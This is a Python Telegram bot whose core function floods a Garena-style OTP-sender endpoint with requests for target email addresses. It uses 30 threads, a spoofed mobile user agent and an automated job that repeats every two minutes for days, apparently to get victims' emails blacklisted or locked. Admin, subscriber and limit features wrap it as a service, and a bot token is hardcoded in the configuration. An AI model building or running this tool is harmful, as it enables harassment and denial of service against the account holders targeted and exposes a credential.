import os
import sys
import time
import threading
import requests
import urllib3
import json
import asyncio
import re
from datetime import datetime
from http.server import HTTPServer, BaseHTTPRequestHandler

# Set timezone
os.environ['TZ'] = 'Asia/Kolkata'
try:
    time.tzset()
except AttributeError:
    pass

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Telegram imports
from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update
from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler, filters, ContextTypes
from telegram.request import HTTPXRequest
from telegram.error import Conflict, NetworkError, TimedOut

# Colors for terminal
C = "\033[1;36m"
G = "\033[1;32m"
R = "\033[1;31m"
Y = "\033[1;33m"
W = "\033[1;37m"
B = "\033[1m"
S = "\033[0m"

print(f"{G}[+] Bot is starting...{S}", flush=True)

# ==================== CONFIGURATION ====================
BOT_TOKEN = "8947082460:AAHlY6qUhwnPkeQogEgbetqZxFwQse3xbX0"
OWNER_USERNAME = "@CURRENTTTTTTTT"
OWNER_ID = 6863389453

ADMIN_FILE = "admins.json"
BANNED_FILE = "banned_users.json"
SUBSCRIBER_FILE = "subscribers.json"
SETTINGS_FILE = "settings.json"
AUTO_LOG_FILE = "auto_log.json"

FORCE_CHANNEL_USERNAME = "@Adityaapis_570"
FORCE_CHANNEL_LINK = "https://t.me/Adityaapis_570"

AUTO_BLACKLIST_FILE = "auto_emails.json"
BROADCAST_FILE = "users.json"

NUM_WORKERS = 30
MAX_BLACKLIST_LIMIT = 1
AUTO_EMAIL_DAYS = 7

AUTO_INTERVAL_MINUTES = 2
AUTO_INTERVAL_SECONDS = AUTO_INTERVAL_MINUTES * 60
WORKER_TIMEOUT = 25

# Global variables
any_success_lock = threading.Lock()
any_success = False
error_event = threading.Event()
stop_event = threading.Event()
error_print_lock = threading.Lock()
generation = 0
user_states = {}
auto_emails_list = []
auto_log = {}
users_list = []
admins_list = []
banned_users_list = []
subscribers_list = []

total_attempts_ever = 0
last_auto_run = 0.0

print(f"{G}[+] Global variables initialized{S}", flush=True)


# ==================== DUMMY WEB SERVER ====================
def run_dummy_server():
    port = int(os.environ.get("PORT", 8080))

    class Handler(BaseHTTPRequestHandler):
        def do_GET(self):
            self.send_response(200)
            self.send_header('Content-type', 'text/plain')
            self.end_headers()
            self.wfile.write(b"Bot is running")

        def log_message(self, format, *args):
            pass

    try:
        server = HTTPServer(('0.0.0.0', port), Handler)
        print(f"{G}[+] Dummy web server running on port {port}{S}", flush=True)
        server.serve_forever()
    except Exception as e:
        print(f"{R}[!] Dummy server error: {e}{S}", flush=True)


# ==================== SETTINGS FUNCTIONS ====================
def load_settings():
    global MAX_BLACKLIST_LIMIT, AUTO_EMAIL_DAYS
    try:
        if os.path.exists(SETTINGS_FILE):
            with open(SETTINGS_FILE, 'r') as f:
                data = json.load(f)
            if isinstance(data, dict):
                if "max_blacklist_limit" in data:
                    try:
                        val = int(data["max_blacklist_limit"])
                        if val >= 0:
                            MAX_BLACKLIST_LIMIT = val
                    except Exception:
                        pass
                if "auto_email_days" in data:
                    try:
                        val = int(data["auto_email_days"])
                        if val >= 1:
                            AUTO_EMAIL_DAYS = val
                    except Exception:
                        pass
            print(f"{G}[+] Loaded settings. Limit={MAX_BLACKLIST_LIMIT}, Days={AUTO_EMAIL_DAYS}{S}", flush=True)
        else:
            save_settings()
    except Exception as e:
        print(f"{R}[!] Error loading settings: {e}{S}", flush=True)


def save_settings():
    try:
        with open(SETTINGS_FILE, 'w') as f:
            json.dump({
                "max_blacklist_limit": MAX_BLACKLIST_LIMIT,
                "auto_email_days": AUTO_EMAIL_DAYS
            }, f, indent=4)
    except Exception as e:
        print(f"{R}[!] Error saving settings: {e}{S}", flush=True)


def set_max_limit(new_limit: int):
    global MAX_BLACKLIST_LIMIT
    if new_limit < 0:
        return False, "Limit cannot be negative!"
    MAX_BLACKLIST_LIMIT = new_limit
    save_settings()
    return True, f"Daily blacklist limit set to {MAX_BLACKLIST_LIMIT} per user"


def set_auto_email_days(new_days: int):
    global AUTO_EMAIL_DAYS
    if new_days < 1:
        return False, "Days must be at least 1!"
    AUTO_EMAIL_DAYS = new_days
    save_settings()
    return True, f"Default auto email duration set to {AUTO_EMAIL_DAYS} days"


def get_email_days(email):
    """Returns per-email custom days, or global default."""
    info = auto_log.get(email, {})
    if "days" in info:
        try:
            return int(info["days"])
        except Exception:
            pass
    return AUTO_EMAIL_DAYS


def get_email_days_left(email):
    """Days left before this email expires."""
    info = auto_log.get(email, {})
    at_str = info.get("at", "")
    if not at_str:
        return None
    try:
        at = datetime.strptime(at_str, '%Y-%m-%d %H:%M:%S')
        now = datetime.now()
        elapsed = (now - at).days
        custom_days = get_email_days(email)
        left = custom_days - elapsed
        return max(0, left)
    except Exception:
        return None


def remove_expired_auto_emails():
    """Remove emails older than their per-email days (or global default)."""
    now = datetime.now()
    expired = []
    for email in list(auto_emails_list):
        info = auto_log.get(email, {})
        at_str = info.get("at", "")
        if at_str:
            try:
                at = datetime.strptime(at_str, '%Y-%m-%d %H:%M:%S')
                days_old = (now - at).days
                custom_days = get_email_days(email)
                if days_old >= custom_days:
                    expired.append(email)
            except Exception:
                pass
    for e in expired:
        if e in auto_emails_list:
            auto_emails_list.remove(e)
        if e in auto_log:
            del auto_log[e]
    if expired:
        save_auto_emails()
        save_auto_log()
    return expired


# ==================== BANNED USERS ====================
def load_banned_users():
    global banned_users_list
    try:
        if os.path.exists(BANNED_FILE):
            with open(BANNED_FILE, 'r') as f:
                banned_users_list = json.load(f)
        else:
            banned_users_list = []
            save_banned_users()
    except Exception as e:
        print(f"{R}[!] Error loading banned users: {e}{S}", flush=True)
        banned_users_list = []


def save_banned_users():
    try:
        with open(BANNED_FILE, 'w') as f:
            json.dump(banned_users_list, f, indent=4)
    except Exception as e:
        print(f"{R}[!] Error saving banned users: {e}{S}", flush=True)


def is_user_banned(user_id):
    return user_id in banned_users_list


def ban_user(user_id):
    global banned_users_list
    if user_id == OWNER_ID:
        return False, "Cannot ban the owner!"
    if is_admin(user_id):
        return False, "Cannot ban an admin!"
    if user_id in banned_users_list:
        return False, "User is already banned!"
    banned_users_list.append(user_id)
    save_banned_users()
    return True, "User banned successfully!"


def unban_user(user_id):
    global banned_users_list
    if user_id not in banned_users_list:
        return False, "User is not banned!"
    banned_users_list.remove(user_id)
    save_banned_users()
    return True, "User unbanned successfully!"


# ==================== ADMIN FUNCTIONS ====================
def load_admins():
    global admins_list
    try:
        if os.path.exists(ADMIN_FILE):
            with open(ADMIN_FILE, 'r') as f:
                admins_list = json.load(f)
        else:
            admins_list = []
            save_admins()
    except Exception as e:
        print(f"{R}[!] Error loading admins: {e}{S}", flush=True)
        admins_list = []


def save_admins():
    try:
        with open(ADMIN_FILE, 'w') as f:
            json.dump(admins_list, f, indent=4)
    except Exception as e:
        print(f"{R}[!] Error saving admins: {e}{S}", flush=True)


def is_admin(user_id):
    if user_id == OWNER_ID:
        return True
    return user_id in admins_list


def add_admin(user_id):
    global admins_list
    if user_id == OWNER_ID:
        return False, "Owner is already the highest authority!"
    if user_id in admins_list:
        return False, "User is already an admin!"
    admins_list.append(user_id)
    save_admins()
    return True, f"User {user_id} is now an ADMIN!"


def remove_admin(user_id):
    global admins_list
    if user_id == OWNER_ID:
        return False, "Cannot remove the owner!"
    if user_id not in admins_list:
        return False, "User is not an admin!"
    admins_list.remove(user_id)
    save_admins()
    return True, f"User {user_id} is no longer an admin!"


# ==================== SUBSCRIBER FUNCTIONS ====================
def load_subscribers():
    global subscribers_list
    try:
        if os.path.exists(SUBSCRIBER_FILE):
            with open(SUBSCRIBER_FILE, 'r') as f:
                subscribers_list = json.load(f)
        else:
            subscribers_list = []
            save_subscribers()
    except Exception as e:
        print(f"{R}[!] Error loading subscribers: {e}{S}", flush=True)
        subscribers_list = []


def save_subscribers():
    try:
        with open(SUBSCRIBER_FILE, 'w') as f:
            json.dump(subscribers_list, f, indent=4)
    except Exception as e:
        print(f"{R}[!] Error saving subscribers: {e}{S}", flush=True)


def is_subscribed(user_id):
    return user_id in subscribers_list


def subscribe_user(user_id):
    global subscribers_list
    if user_id == OWNER_ID:
        return False, "Owner already has unlimited access!"
    if is_admin(user_id):
        return False, "Admins already have unlimited access!"
    if user_id in subscribers_list:
        return False, "User is already subscribed!"
    subscribers_list.append(user_id)
    save_subscribers()
    return True, "Subscription added successfully!"


def unsubscribe_user(user_id):
    global subscribers_list
    if user_id not in subscribers_list:
        return False, "User is not subscribed!"
    subscribers_list.remove(user_id)
    save_subscribers()
    return True, "Subscription removed successfully!"


def has_unlimited_access(user_id):
    return is_admin(user_id) or is_subscribed(user_id)


# ==================== USER LIST FUNCTIONS ====================
def _today_str():
    return datetime.now().strftime('%Y-%m-%d')


def _ensure_daily_reset(user):
    today = _today_str()
    if user.get('daily_date') != today:
        user['daily_count'] = 0
        user['daily_date'] = today
        return True
    return False


def load_users():
    global users_list
    try:
        if os.path.exists(BROADCAST_FILE):
            with open(BROADCAST_FILE, 'r') as f:
                users_list = json.load(f)
            migrated = False
            for u in users_list:
                if 'daily_count' not in u:
                    u['daily_count'] = 0
                    migrated = True
                if 'daily_date' not in u:
                    u['daily_date'] = _today_str()
                    migrated = True
                if 'blacklist_count' not in u:
                    u['blacklist_count'] = 0
                    migrated = True
            if migrated:
                save_users()
        else:
            users_list = []
            save_users()
    except Exception as e:
        print(f"{R}[!] Error loading users: {e}{S}", flush=True)
        users_list = []


def save_users():
    try:
        with open(BROADCAST_FILE, 'w') as f:
            json.dump(users_list, f, indent=4)
    except Exception as e:
        print(f"{R}[!] Error saving users: {e}{S}", flush=True)


def add_user(user_id, username, full_name):
    global users_list
    if user_id is None:
        return False
    for user in users_list:
        if user['id'] == user_id:
            return False

    today = _today_str()
    users_list.append({
        'id': user_id,
        'username': username if username else 'N/A',
        'name': full_name if full_name else 'Unknown',
        'joined': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
        'blacklist_count': 0,
        'daily_count': 0,
        'daily_date': today
    })
    save_users()
    return True


def is_new_user(user_id):
    for user in users_list:
        if user['id'] == user_id:
            return False
    return True


def get_user_blacklist_count(user_id):
    for user in users_list:
        if user['id'] == user_id:
            if _ensure_daily_reset(user):
                save_users()
            return user.get('daily_count', 0)
    return 0


def get_user_total_count(user_id):
    for user in users_list:
        if user['id'] == user_id:
            return user.get('blacklist_count', 0)
    return 0


def increment_blacklist_count(user_id):
    for user in users_list:
        if user['id'] == user_id:
            _ensure_daily_reset(user)
            user['daily_count'] = user.get('daily_count', 0) + 1
            user['blacklist_count'] = user.get('blacklist_count', 0) + 1
            save_users()
            return True
    return False


def find_user_by_id(user_id):
    for user in users_list:
        if user['id'] == user_id:
            return user
    return None


# ==================== AUTO BLACKLIST FUNCTIONS ====================
def load_auto_emails():
    global auto_emails_list
    try:
        if os.path.exists(AUTO_BLACKLIST_FILE):
            with open(AUTO_BLACKLIST_FILE, 'r') as f:
                data = json.load(f)
                if isinstance(data, list):
                    auto_emails_list = [str(e).strip() for e in data if e]
                else:
                    auto_emails_list = []
        else:
            auto_emails_list = []
            save_auto_emails()
    except Exception as e:
        print(f"{R}[!] Error loading emails: {e}{S}", flush=True)
        auto_emails_list = []


def save_auto_emails():
    try:
        with open(AUTO_BLACKLIST_FILE, 'w') as f:
            json.dump(auto_emails_list, f, indent=4)
    except Exception as e:
        print(f"{R}[!] Error saving emails: {e}{S}", flush=True)


def load_auto_log():
    global auto_log
    try:
        if os.path.exists(AUTO_LOG_FILE):
            with open(AUTO_LOG_FILE, 'r') as f:
                auto_log = json.load(f)
        else:
            auto_log = {}
            save_auto_log()
    except Exception as e:
        print(f"{R}[!] Error loading auto log: {e}{S}", flush=True)
        auto_log = {}


def save_auto_log():
    try:
        with open(AUTO_LOG_FILE, 'w') as f:
            json.dump(auto_log, f, indent=4)
    except Exception as e:
        print(f"{R}[!] Error saving auto log: {e}{S}", flush=True)


def is_valid_email(text):
    if not text:
        return False
    text = text.strip()
    if len(text) > 254 or len(text) < 6:
        return False
    if '\n' in text or '\r' in text or ' ' in text:
        return False
    pattern = r'^[a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+$'
    return re.match(pattern, text) is not None


def worker(email, gen):
    global any_success
    while not stop_event.is_set():
        if gen != generation:
            return
        url = "https://swap-otp-sender.vercel.app/send"
        headers = {
            "User-Agent": "GarenaMSDK/4.0.41(TECNO KJ5 ;Android 13;en;HK;app 1.123.1 2019120270;)",
            "Accept": "application/json",
            "Content-Type": "application/x-www-form-urlencoded",
            "Connection": "Keep-Alive",
            "Accept-Encoding": "gzip"
        }
        data = {"app_id": "100067", "email": email, "locale": "en_HK"}

        try:
            resp = requests.post(url, headers=headers, data=data, timeout=15)
            if resp.status_code == 200:
                with any_success_lock:
                    any_success = True
            else:
                with error_print_lock:
                    if not error_event.is_set():
                        error_event.set()
                        stop_event.set()
                return
        except Exception:
            with error_print_lock:
                if not error_event.is_set():
                    error_event.set()
                    stop_event.set()
            return


def wait_for_error(timeout=WORKER_TIMEOUT):
    stop_event.wait(timeout=timeout)


def blacklist_email(email):
    global any_success, error_event, stop_event, generation

    generation += 1
    any_success = False
    error_event.clear()
    stop_event.clear()

    threads = []
    for _ in range(NUM_WORKERS):
        t = threading.Thread(target=worker, args=(email, generation))
        t.daemon = True
        t.start()
        threads.append(t)

    wait_for_error(timeout=WORKER_TIMEOUT)
    stop_event.set()

    for t in threads:
        t.join(timeout=2)

    if error_event.is_set():
        if not any_success:
            return False, "🔴 EMAIL ALREADY BLACKLISTED"
        else:
            return True, "🟢 EMAIL BLACKLISTED SUCCESSFULLY"
    else:
        if any_success:
            return True, "🟢 EMAIL BLACKLISTED SUCCESSFULLY"
        return False, "⚠️ TIMEOUT - TRY AGAIN"


# ==================== AUTO BLACKLIST JOB ====================
async def auto_blacklist_job(context: ContextTypes.DEFAULT_TYPE):
    global any_success, error_event, stop_event, generation, total_attempts_ever

    expired = remove_expired_auto_emails()
    if expired and OWNER_ID:
        try:
            expired_list = "\n".join([f"• <code>{e}</code>" for e in expired[:20]])
            more = "" if len(expired) <= 20 else f"\n... +{len(expired) - 20} more"
            await context.bot.send_message(
                chat_id=OWNER_ID,
                text=(f"🗑️ <b>{len(expired)} EXPIRED EMAILS REMOVED</b>\n\n"
                      f"{expired_list}{more}\n\n"
                      f"📊 Remaining: <b>{len(auto_emails_list)}</b>\n"
                      f"🕒 {datetime.now().strftime('%I:%M %p, %d-%m-%Y')}"),
                parse_mode='HTML'
            )
        except Exception:
            pass

    if not auto_emails_list:
        return

    if OWNER_ID:
        try:
            await context.bot.send_message(
                chat_id=OWNER_ID,
                text=f"🤖 <b>AUTO BLACKLIST STARTED</b>\n\n📧 Total: {len(auto_emails_list)}\n🕒 {datetime.now().strftime('%I:%M %p')}",
                parse_mode='HTML'
            )
        except Exception:
            pass

    results = {"success": 0, "failed": 0, "skipped": 0, "total": len(auto_emails_list)}
    emails_to_process = list(auto_emails_list)

    for email in emails_to_process:
        any_success = False
        error_event.clear()
        stop_event.clear()
        generation += 1

        threads = []
        for _ in range(NUM_WORKERS):
            t = threading.Thread(target=worker, args=(email, generation))
            t.daemon = True
            t.start()
            threads.append(t)

        wait_for_error(timeout=WORKER_TIMEOUT)
        stop_event.set()

        for t in threads:
            t.join(timeout=2)

        total_attempts_ever += 1

        if any_success:
            results["success"] += 1
        elif error_event.is_set():
            results["skipped"] += 1
        else:
            results["failed"] += 1

        time.sleep(2)

    if OWNER_ID:
        try:
            await context.bot.send_message(
                chat_id=OWNER_ID,
                text=(f"✅ <b>AUTO BLACKLIST COMPLETE</b>\n\n"
                      f"📊 Total: {results['total']}\n"
                      f"🟢 Success: {results['success']}\n"
                      f"🔴 Failed: {results['failed']}\n"
                      f"🟡 Skipped: {results['skipped']}\n\n"
                      f"🔁 Total attempts ever: {total_attempts_ever}\n"
                      f"🕒 {datetime.now().strftime('%I:%M %p, %d-%m-%Y')}"),
                parse_mode='HTML'
            )
        except Exception:
            pass


# ==================== BAN/UNBAN COMMANDS ====================
async def ban_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if user is None:
        return
    if user.id != OWNER_ID:
        await update.message.reply_text("⛔ <b>Only OWNER can use this command!</b>", parse_mode='HTML')
        return
    if not context.args:
        await update.message.reply_text("🚫 <b>BAN USER</b>\n\nUsage: <code>/ban &lt;user_id&gt;</code>", parse_mode='HTML')
        return
    try:
        target_id = int(context.args[0])
        success, msg = ban_user(target_id)
        if success:
            try:
                await context.bot.send_message(chat_id=target_id, text=f"🚫 <b>YOU HAVE BEEN BANNED!</b>\n\nContact: {OWNER_USERNAME}", parse_mode='HTML')
            except Exception:
                pass
            await update.message.reply_text(f"✅ <b>{msg}</b>", parse_mode='HTML')
        else:
            await update.message.reply_text(f"❌ <b>{msg}</b>", parse_mode='HTML')
    except ValueError:
        await update.message.reply_text("❌ Invalid User ID!")


async def unban_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if user is None:
        return
    if user.id != OWNER_ID:
        await update.message.reply_text("⛔ <b>Only OWNER can use this command!</b>", parse_mode='HTML')
        return
    if not context.args:
        await update.message.reply_text("✅ <b>UNBAN USER</b>\n\nUsage: <code>/unban &lt;user_id&gt;</code>", parse_mode='HTML')
        return
    try:
        target_id = int(context.args[0])
        success, msg = unban_user(target_id)
        if success:
            try:
                await context.bot.send_message(chat_id=target_id, text=f"✅ <b>YOU HAVE BEEN UNBANNED!</b>\n\nContact: {OWNER_USERNAME}", parse_mode='HTML')
            except Exception:
                pass
            await update.message.reply_text(f"✅ <b>{msg}</b>", parse_mode='HTML')
        else:
            await update.message.reply_text(f"❌ <b>{msg}</b>", parse_mode='HTML')
    except ValueError:
        await update.message.reply_text("❌ Invalid User ID!")


async def banned_list_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if user is None or user.id != OWNER_ID:
        await update.message.reply_text("⛔ <b>Only OWNER can use this command!</b>", parse_mode='HTML')
        return
    if not banned_users_list:
        await update.message.reply_text("📋 <b>BANNED USERS</b>\n\n✨ No users are banned.", parse_mode='HTML')
        return
    banned_text = "\n".join([f"• <code>{uid}</code>" for uid in banned_users_list])
    await update.message.reply_text(
        f"📋 <b>BANNED USERS</b>\n\n{banned_text}\n\n🔢 Total: <b>{len(banned_users_list)}</b>",
        parse_mode='HTML'
    )


# ==================== AUTO EMAIL HELPER ====================
def _add_auto_emails(user, emails_raw, days):
    """Helper to add emails with custom days. Returns (valid, invalid)."""
    valid = []
    invalid = []
    now_str = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    for email in emails_raw:
        email = email.strip()
        if not email:
            continue
        if is_valid_email(email):
            if email not in auto_emails_list:
                auto_emails_list.append(email)
                valid.append(email)
                auto_log[email] = {
                    "by_id": user.id,
                    "by_name": user.full_name or "Unknown",
                    "by_username": user.username or "N/A",
                    "at": now_str,
                    "days": days
                }
            else:
                invalid.append(f"{email} (exists)")
        else:
            invalid.append(f"{email} (invalid)")
    save_auto_emails()
    save_auto_log()
    return valid, invalid


# ==================== AUTO EMAIL COMMANDS (ADMIN/OWNER) ====================
async def autoadd_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """
    Usage:
      /autoadd email1@x.com, email2@x.com          -> default days
      /autoadd email1@x.com, email2@x.com 5        -> 5 days
    """
    user = update.effective_user
    if user is None:
        return
    if not is_admin(user.id):
        await update.message.reply_text("⛔ <b>ACCESS DENIED</b>", parse_mode='HTML')
        return
    if not context.args:
        await update.message.reply_text(
            f"📂 <b>ADD AUTO EMAILS</b>\n\n"
            f"<b>Usage:</b>\n"
            f"• <code>/autoadd email@x.com</code> → default ({AUTO_EMAIL_DAYS} days)\n"
            f"• <code>/autoadd email@x.com 5</code> → custom 5 days\n"
            f"• <code>/autoadd a@x.com, b@x.com 3</code> → multiple, 3 days\n\n"
            f"♾️ No limit for admins!",
            parse_mode='HTML'
        )
        return

    # Parse args: last arg may be a number = days
    raw_parts = ' '.join(context.args).strip()
    days = AUTO_EMAIL_DAYS  # default

    # Check if last token is a number
    tokens = raw_parts.rsplit(' ', 1)
    if len(tokens) == 2 and tokens[1].strip().isdigit():
        days = int(tokens[1].strip())
        raw_parts = tokens[0].strip()

    if days < 1:
        await update.message.reply_text("❌ Days must be at least 1!", parse_mode='HTML')
        return

    emails_raw = [e.strip() for e in raw_parts.split(',')]
    valid, invalid = _add_auto_emails(user, emails_raw, days)

    if valid and OWNER_ID and user.id != OWNER_ID:
        try:
            email_list = "\n".join([f"• <code>{e}</code>" for e in valid])
            await context.bot.send_message(
                chat_id=OWNER_ID,
                text=(f"📥 <b>NEW AUTO EMAILS ADDED</b>\n\n"
                      f"👤 Admin: <b>{user.full_name or 'Unknown'}</b>\n"
                      f"🔗 @{user.username or 'N/A'}\n"
                      f"🆔 <code>{user.id}</code>\n\n"
                      f"📧 Added ({len(valid)}):\n{email_list}\n\n"
                      f"⏰ Duration: <b>{days} days</b>\n"
                      f"📊 Total: {len(auto_emails_list)}\n"
                      f"🕒 {datetime.now().strftime('%I:%M %p, %d-%m-%Y')}"),
                parse_mode='HTML'
            )
        except Exception as e:
            print(f"{R}[!] Owner notify error: {e}{S}", flush=True)

    response = (f"✅ <b>AUTO UPDATED</b>\n\n"
                f"🟢 Added: <b>{len(valid)}</b>\n"
                f"🔴 Failed: <b>{len(invalid)}</b>\n"
                f"⏰ Duration: <b>{days} days</b>\n"
                f"📊 Total: <b>{len(auto_emails_list)}</b>")
    if valid:
        response += "\n\n<b>🟢 Added:</b>\n" + "\n".join([f"• <code>{e}</code>" for e in valid])
    if invalid:
        response += "\n\n<b>🔴 Failed:</b>\n" + "\n".join([f"• <code>{e}</code>" for e in invalid])
    await update.message.reply_text(response, parse_mode='HTML')


async def autoremove_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if user is None:
        return
    if not is_admin(user.id):
        await update.message.reply_text("⛔ <b>ACCESS DENIED</b>", parse_mode='HTML')
        return
    if not context.args:
        await update.message.reply_text(
            "❌ <b>REMOVE AUTO EMAILS</b>\n\n"
            "Usage: <code>/autoremove email1@x.com, email2@x.com</code>",
            parse_mode='HTML'
        )
        return

    raw = ' '.join(context.args)
    emails = [e.strip() for e in raw.split(',')]
    removed = []
    not_found = []

    for email in emails:
        if not email:
            continue
        if email in auto_emails_list:
            auto_emails_list.remove(email)
            removed.append(email)
            if email in auto_log:
                del auto_log[email]
        else:
            not_found.append(email)

    save_auto_emails()
    save_auto_log()

    if removed and OWNER_ID and user.id != OWNER_ID:
        try:
            removed_list = "\n".join([f"• <code>{e}</code>" for e in removed])
            await context.bot.send_message(
                chat_id=OWNER_ID,
                text=(f"❌ <b>AUTO EMAILS REMOVED</b>\n\n"
                      f"👤 Admin: <b>{user.full_name or 'Unknown'}</b>\n"
                      f"🔗 @{user.username or 'N/A'}\n"
                      f"🆔 <code>{user.id}</code>\n\n"
                      f"📧 Removed ({len(removed)}):\n{removed_list}\n\n"
                      f"📊 Total: {len(auto_emails_list)}\n"
                      f"🕒 {datetime.now().strftime('%I:%M %p, %d-%m-%Y')}"),
                parse_mode='HTML'
            )
        except Exception:
            pass

    response = (f"🗑️ <b>REMOVED</b>\n\n"
                f"🟢 Removed: <b>{len(removed)}</b>\n"
                f"🔴 Not Found: <b>{len(not_found)}</b>\n"
                f"📊 Total: <b>{len(auto_emails_list)}</b>")
    if removed:
        response += "\n\n<b>🟢 Removed:</b>\n" + "\n".join([f"• <code>{e}</code>" for e in removed])
    await update.message.reply_text(response, parse_mode='HTML')


async def autolist_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if user is None:
        return
    if not is_admin(user.id):
        await update.message.reply_text("⛔ <b>ACCESS DENIED</b>", parse_mode='HTML')
        return
    if not auto_emails_list:
        await update.message.reply_text("📋 <b>AUTO LIST</b>\n\n✨ No emails.", parse_mode='HTML')
        return

    lines = []
    for e in auto_emails_list:
        info = auto_log.get(e, {})
        by = info.get("by_name", "Unknown")
        at = info.get("at", "")
        days_left = get_email_days_left(e)
        custom_days = get_email_days(e)
        if at:
            date_short = at.split(' ')[0]
            extra = f" | ⏰ {days_left}/{custom_days}d" if days_left is not None else ""
            lines.append(f"• <code>{e}</code>\n   └ by {by} ({date_short}){extra}")
        else:
            lines.append(f"• <code>{e}</code>")

    text = (f"📋 <b>AUTO LIST</b>\n\n"
            f"🔢 Total: <b>{len(auto_emails_list)}</b>\n"
            f"⏱️ Interval: Every {AUTO_INTERVAL_MINUTES} min\n\n"
            + "\n".join(lines))
    if len(text) > 4000:
        text = text[:3900] + "\n\n... (truncated)"
    await update.message.reply_text(text, parse_mode='HTML')


async def autoclear_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if user is None:
        return
    if user.id != OWNER_ID:
        await update.message.reply_text("⛔ <b>Only OWNER can clear auto list!</b>", parse_mode='HTML')
        return
    count_before = len(auto_emails_list)
    auto_emails_list.clear()
    auto_log.clear()
    save_auto_emails()
    save_auto_log()
    await update.message.reply_text(f"🗑️ <b>CLEARED!</b>\n\n❌ Removed {count_before} emails.", parse_mode='HTML')


# ==================== SET LIMIT / DAYS ====================
async def setlimit_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if user is None or user.id != OWNER_ID:
        await update.message.reply_text("⛔ <b>Only OWNER can use this command!</b>", parse_mode='HTML')
        return
    if not context.args:
        await update.message.reply_text(
            f"⚙️ <b>SET DAILY LIMIT</b>\n\n"
            f"Current: <b>{MAX_BLACKLIST_LIMIT}</b> per user\n\n"
            f"Usage: <code>/setlimit &lt;number&gt;</code>",
            parse_mode='HTML'
        )
        return
    try:
        new_limit = int(context.args[0])
    except ValueError:
        await update.message.reply_text("❌ Invalid number!")
        return
    success, msg = set_max_limit(new_limit)
    if success:
        await update.message.reply_text(f"✅ <b>UPDATED</b>\n\n{msg}", parse_mode='HTML')
    else:
        await update.message.reply_text(f"❌ {msg}")


async def setdays_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Set DEFAULT days for new auto emails."""
    user = update.effective_user
    if user is None or user.id != OWNER_ID:
        await update.message.reply_text("⛔ <b>Only OWNER can use this command!</b>", parse_mode='HTML')
        return
    if not context.args:
        await update.message.reply_text(
            f"⏰ <b>SET DEFAULT DAYS</b>\n\n"
            f"Current default: <b>{AUTO_EMAIL_DAYS}</b> days\n\n"
            f"Usage: <code>/setdays &lt;number&gt;</code>\n\n"
            f"ℹ️ Ye default days hai — jab koi custom days na de.\n"
            f"Custom days ke liye: <code>/autoadd email@x.com 5</code>",
            parse_mode='HTML'
        )
        return
    try:
        new_days = int(context.args[0])
    except ValueError:
        await update.message.reply_text("❌ Invalid number!")
        return
    success, msg = set_auto_email_days(new_days)
    if success:
        await update.message.reply_text(f"✅ <b>UPDATED</b>\n\n{msg}", parse_mode='HTML')
    else:
        await update.message.reply_text(f"❌ {msg}")


# ==================== ADMIN MANAGEMENT ====================
async def addadmin_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if user is None or user.id != OWNER_ID:
        await update.message.reply_text("⛔ <b>Only OWNER can use this command!</b>", parse_mode='HTML')
        return
    if not context.args:
        await update.message.reply_text(
            "👑 <b>ADD ADMIN</b>\n\nUsage: <code>/addadmin &lt;user_id&gt;</code>",
            parse_mode='HTML'
        )
        return
    try:
        target_id = int(context.args[0])
    except ValueError:
        await update.message.reply_text("❌ Invalid User ID!")
        return
    success, msg = add_admin(target_id)
    if success:
        try:
            await context.bot.send_message(
                chat_id=target_id,
                text=(f"🎉 <b>CONGRATULATIONS!</b>\n\n"
                      f"🛡️ You are now an <b>ADMIN</b>!\n\n"
                      f"♾️ Unlimited blacklist\n"
                      f"📂 Auto email add/remove\n\n"
                      f"Contact: {OWNER_USERNAME}"),
                parse_mode='HTML'
            )
        except Exception:
            pass
        await update.message.reply_text(f"✅ <b>{msg}</b>", parse_mode='HTML')
    else:
        await update.message.reply_text(f"❌ {msg}")


async def removeadmin_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if user is None or user.id != OWNER_ID:
        await update.message.reply_text("⛔ <b>Only OWNER can use this command!</b>", parse_mode='HTML')
        return
    if not context.args:
        await update.message.reply_text("❌ <b>REMOVE ADMIN</b>\n\nUsage: <code>/removeadmin &lt;user_id&gt;</code>", parse_mode='HTML')
        return
    try:
        target_id = int(context.args[0])
    except ValueError:
        await update.message.reply_text("❌ Invalid User ID!")
        return
    success, msg = remove_admin(target_id)
    if success:
        try:
            await context.bot.send_message(chat_id=target_id, text=f"⚠️ <b>ADMIN ACCESS REMOVED</b>\n\nContact: {OWNER_USERNAME}", parse_mode='HTML')
        except Exception:
            pass
        await update.message.reply_text(f"✅ <b>{msg}</b>", parse_mode='HTML')
    else:
        await update.message.reply_text(f"❌ {msg}")


async def adminlist_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if user is None or user.id != OWNER_ID:
        await update.message.reply_text("⛔ <b>Only OWNER can use this command!</b>", parse_mode='HTML')
        return
    if not admins_list:
        await update.message.reply_text(
            f"👑 <b>ADMIN LIST</b>\n\n✨ No admins yet.\n\n👑 Owner: <code>{OWNER_ID}</code>",
            parse_mode='HTML'
        )
        return
    admin_text = "\n".join([f"• <code>{uid}</code>" for uid in admins_list])
    await update.message.reply_text(
        f"👑 <b>ADMIN LIST</b>\n\n"
        f"👑 <b>OWNER:</b> <code>{OWNER_ID}</code>\n\n"
        f"🛡️ <b>ADMINS:</b>\n{admin_text}\n\n"
        f"🔢 Total: <b>{len(admins_list)}</b>",
        parse_mode='HTML'
    )


